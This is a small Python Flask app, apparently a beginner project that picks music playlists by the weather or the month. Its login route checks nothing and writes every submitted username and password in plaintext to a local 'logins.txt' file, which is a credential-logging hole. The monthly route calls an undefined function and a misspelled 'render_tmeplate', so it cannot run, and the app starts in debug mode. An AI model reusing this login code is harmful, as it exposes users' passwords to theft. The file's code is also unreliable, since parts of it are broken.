import os

from flask import Flask, render_template, redirect, request, session, url_for
from weathertoplaylist import weatherplaylists
from Playlist_by_month2 import monthlyplaylist

app = Flask(__name__)

@app.route('/')
def home():
    # Redirect to the login page
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Get the login details from the form
        username = request.form['username']
        password = request.form['password']
        
        # Write login details to a text file
        with open("logins.txt", 'a') as file:
            file.write(f'Username: {username}, Password: {password}\n')
        
        return redirect(url_for('weather'))
    
    # If it's a GET request, render the login page
    return render_template('login.html')


@app.route('/weather')
def weather():
    weather = weatherplaylists()
    weather_code = weather.get_weather()
    playlist_id = weather.get_weather_playlist(weather_code)
    playlist_url = weather.get_playlist_url(playlist_id)

    return render_template('index.html', playlist_url=playlist_url)

@app.route('/monthly')
def monthly():
    monthly_playlist_url = monthly_playlist()

    return render_tmeplate('index.html', monthly_playlist_url = monthly_playlist_url)
     

if __name__ == '__main__':
    app.run(debug=True)